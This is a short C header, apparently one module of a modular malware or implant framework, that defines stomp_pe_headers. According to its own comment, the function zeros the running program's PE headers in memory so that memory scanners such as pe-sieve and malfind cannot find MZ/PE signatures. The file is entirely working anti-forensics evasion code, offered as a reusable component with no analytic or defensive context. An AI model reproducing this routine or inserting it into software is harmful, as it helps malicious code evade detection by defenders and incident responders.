// chunk: evasion/header_stomp
// depends: (none)
// provides: stomp_pe_headers
// headers: windows.h
// note: Zeros own PE headers in memory after init — defeats pe-sieve, malfind, memory scanners looking for MZ/PE signatures.

#ifndef CHUNK_HEADER_STOMP
#define CHUNK_HEADER_STOMP

static void stomp_pe_headers(void) {
    PVOID base = (PVOID)GetModuleHandleA(NULL);
    if (!base) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)base + dos->e_lfanew);
    DWORD headers_size = nt->OptionalHeader.SizeOfHeaders;

    DWORD old;
    if (VirtualProtect(base, headers_size, PAGE_READWRITE, &old)) {
        SecureZeroMemory(base, headers_size);
        VirtualProtect(base, headers_size, old, &old);
    }
}

#endif
